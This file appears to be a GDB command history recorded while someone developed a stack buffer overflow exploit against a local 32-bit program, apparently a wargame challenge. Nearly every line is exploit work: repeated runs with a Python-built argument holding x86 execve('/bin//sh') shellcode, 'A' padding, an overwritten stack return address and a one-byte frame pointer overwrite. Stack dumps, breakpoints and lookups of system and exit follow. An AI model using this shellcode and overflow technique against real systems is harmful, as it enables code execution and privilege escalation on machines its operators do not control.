disas f
exit
q
disas f
run $(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 245 + "BBBB"')
disas f
b *f+147
run $(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 245 + "BBBB"')
x/200x $esp
run $(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 145 + "\x30\xed\xff\xbf" + "A"*96 + "BBBB"')
x/200x $esp
run $(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 241 + "\x30\xed\xff\xbf" + "BBBB"')
x/200x $esp
run $(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 241 + "\x30\xed\xff\xbf" + "\x00"')
x/200x $esp
run $(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 233 + "\x3c\xed\xff\xbf" + "A"*8 + "\x00"')
x/200x $esp
run $(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 233 + "\x3c\xed\xff\xbf" + "A"*8 + "\x38"')
x/200x $esp
c
run $(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 233 + "\x3c\xed\xff\xbf" + "A"*8 + "\x38"')
n
disas no_need
b *no_need+21
c
n
c
run $(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 233 + "\x3c\xed\xff\xbf" + "A"*8 + "\x38"')
c
n
n
n
run $(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 233 + "\x3c\xed\xff\xbf" + "A"*8 + "\x38"')
c
n
step
p system
p exit
x/500x $esp
x/500s $esp
x/s 0xbffff30b
run $(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 233 + "\x3c\xed\xff\xbf" + "A"*8 + "\x38"')
q
